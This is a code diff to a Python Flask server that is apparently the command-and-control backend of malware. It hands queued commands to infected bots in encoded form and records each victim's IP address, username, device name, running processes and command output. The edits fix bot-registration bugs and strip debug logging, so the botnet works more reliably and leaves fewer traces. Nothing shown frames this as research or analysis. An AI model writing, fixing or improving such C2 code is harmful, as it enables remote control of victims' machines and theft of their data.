@@ -52,8 +52,8 @@ def heartbeat():
             bot_id = uuid.uuid1()
             print("Adding new UUID to db:" + str(bot_id))
             resp.set_cookie("X-Session-ID", str(bot_id), expires=datetime.datetime.now() + datetime.timedelta(days=30))
-            dbmain.add_bot_to_db(conn, bot_id, checkin)
-            return
+            dbmain.add_bot_to_db(conn, str(bot_id), checkin)
+            return resp
         else:
             id = request.cookies['X-Session-ID']
             dbmain.add_bot_to_db(conn, id, checkin)
@@ -61,7 +61,6 @@ def heartbeat():
             dbmain.get_bot_info(conn, id)
             command = dbmain.get_bot_commandqueue(conn, id)[0]
             if command != "":
-                print("Command to execute: ", command)
                 dbmain.update_commandqueue(conn, id, "")
                 return mal_encode(app.malware_key, command)
         return mal_encode(app.malware_key, "1")
@@ -84,7 +83,6 @@ def info():
             conn = get_db()
 
             spltdata = d.split('&')
-            print(spltdata)
             dbmain.update_ip(conn, id, spltdata[0])
             dbmain.update_username(conn, id, spltdata[1])
             dbmain.update_devicename(conn, id, spltdata[2])
@@ -106,7 +104,6 @@ def ps():
             print('No cookie found - cannot update info')
             return mal_encode(app.malware_key, "Error: no cookie")
         else:
-            print(request.cookies['X-Session-ID'])
             conn = get_db()
             proc_string = mal_decode(app.malware_key, request.data)
             dbmain.update_proclist(conn, request.cookies['X-Session-ID'], proc_string)
@@ -151,7 +148,6 @@ def out():
             print('No cookie found - cannot update info')
             return mal_encode(app.malware_key, "Error: no cookie")
         else:
-            print(request.cookies['X-Session-ID'])
             conn = get_db()
             out_string = mal_decode(app.malware_key, request.data)
             dbmain.update_commandout(conn, request.cookies['X-Session-ID'], out_string)
